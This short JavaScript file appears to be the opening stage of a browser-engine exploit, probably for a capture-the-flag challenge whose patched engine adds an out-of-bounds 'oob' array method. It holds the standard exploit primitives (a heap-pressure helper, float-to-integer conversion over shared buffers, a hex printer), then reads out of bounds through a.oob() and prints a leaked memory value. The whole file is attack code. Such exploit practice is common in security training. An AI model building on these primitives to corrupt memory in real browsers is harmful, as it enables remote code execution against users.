//
// Union{
//      unsigned int u32[2];
//      double    f64;
// }
function gc(){
    for(let i = 0 ; i < 0x10; i++){
        new ArrayBuffer(0x1000000);
    }
}

var f64 = new Float64Array(1);
var u32 = new Uint32Array(f64.buffer);

function d2u(v){
    f64[0] = v;
    return u32;
}

function u2d(lo, hi){
    u32[0] = lo;
    u32[1] = hi;
    return f64[0];
}

function hex(lo, hi){
    if(lo == 0 ){
        return "0x" + hi.toString(16) + "-00000000";
    }

    if(hi == 0){
        return "0x" + lo.toString(16);
    }

    return "0x" + hi.toString(16) + "-" + lo.toString(16);
}

var a = [1.1,2.2];
var oob_val  = a.oob();
var leak_val = d2u(oob_val);
console.log("[-] leaked value: " + hex(leak_val[0], leak_val[1]));
